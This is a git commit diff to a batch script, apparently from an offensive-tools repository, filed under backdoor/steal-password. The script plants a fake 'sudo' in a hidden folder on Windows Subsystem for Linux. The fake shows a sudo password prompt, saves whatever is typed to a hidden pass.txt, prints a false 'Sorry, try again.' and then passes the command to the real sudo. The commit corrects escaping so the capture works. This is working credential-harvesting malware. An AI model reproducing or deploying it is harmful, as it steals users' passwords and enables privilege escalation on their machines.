d7a876ddccc005079a089ed670a39e5ca62f2af5
Cervoise <antoine.cervoise@gmail.com>
2018-10-10 19:33:59 +0200

    Update WSL-fake-sudo.bat

--- backdoor/steal-password/WSL-fake-sudo.bat
+++ backdoor/steal-password/WSL-fake-sudo.bat
@@ -5,7 +5,7 @@ echo "read -sp \"[sudo] password for $USER: \" sudopass" > .hidden/sudo
 echo "echo \"\"" >> .hidden/sudo
 echo "sleep 2" >> .hidden/sudo
 echo "echo \"Sorry, try again.\"" >> .hidden/sudo
-echo "echo $sudopass >> .hidden/pass.txt" >> .hidden/sudo
+echo "echo \$sudopass >> .hidden/pass.txt" >> .hidden/sudo
 echo "/usr/bin/sudo \$1" >> .hidden/sudo
 chmod +x .hidden/sudo
 exit
